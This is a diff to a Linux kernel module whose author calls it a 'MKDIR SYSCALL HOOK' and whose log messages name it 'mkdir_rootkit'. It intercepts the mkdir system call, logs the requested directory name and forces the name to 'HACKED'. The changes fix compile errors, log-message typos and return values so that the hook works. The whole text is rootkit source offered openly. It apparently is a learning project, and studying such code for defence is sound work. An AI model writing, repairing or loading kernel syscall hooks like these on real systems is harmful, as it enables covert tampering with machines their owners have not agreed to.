@@ -5,7 +5,7 @@
 #include <linux/version.h>
 #include <linux/namei.h>
 
-#include"alfred.h"
+#include "alfred.h"
 
 
 MODULE_LICENSE("GPL");
@@ -13,7 +13,7 @@ MODULE_AUTHOR("0x4p0ll0");
 MODULE_VERSION("0.1");
 MODULE_DESCRIPTION("MKDIR SYSCALL HOOK");
 
-#if define(CONFIG_X86_64) && (LINUX_KERNEL_VERSION >= KERNEL_VERSION(4,17,0))
+#if defined (CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
   #define PTREGS_SYSCALL_STUBS 1
 #endif
 
@@ -23,8 +23,9 @@ MODULE_DESCRIPTION("MKDIR SYSCALL HOOK");
     asmlinkage int hook_mkdir(const struct pt_regs* regs) {
         char __user* pathname = (char*)regs->di;
         char dir_name[NAME_MAX] = {0};
+        char hacked[] = "HACKED";
         long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
-        
+
         if (error > 0) {
             pr_info("mkdir_rootkit: trying to create directory with name: %s -> forcing 'HACKED' \n", dir_name);
         }
@@ -32,23 +33,21 @@ MODULE_DESCRIPTION("MKDIR SYSCALL HOOK");
             pr_err("mkdir_rootkit: copy_to_user failed\n");
             return -EFAULT;
         }
-        orig_mkdir(regs);
-        return 0;
+        return orig_mkdir(regs);
     }
 
 #else
     static asmlinkage long (*orig_mkdir)(const char __user* pathname, umode_t mode);
     asmlinkage int hook_mkdir(const char __user* pathname, umode_t mode) {
         char dir_name[NAME_MAX] = {0};
-	char hacked[]="HACKED";
+        char hacked[] = "HACKED";
         long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
         if (error > 0) {
-            pr_info("mkdir_ootkit: trying to create directory with name: %s\n", dir_name);
+            pr_info("mkdir_rootkit: trying to create directory with name: %s\n", dir_name);
         }
 
-        orig_mkdir(pathname, mode);
-        return 0;
+        return orig_mkdir(pathname, mode);
     }
 #endif
 
@@ -69,7 +68,7 @@ static int __init rootkit_init(void) {
 
 static void __exit rootkit_exit(void) {
     remove_hooks(hooks, ARRAY_SIZE(hooks));
-    pr_info("mkdir_rootkits: unloaded\n");
+    pr_info("mkdir_rootkit: unloaded\n");
 }
 
 module_init(rootkit_init);
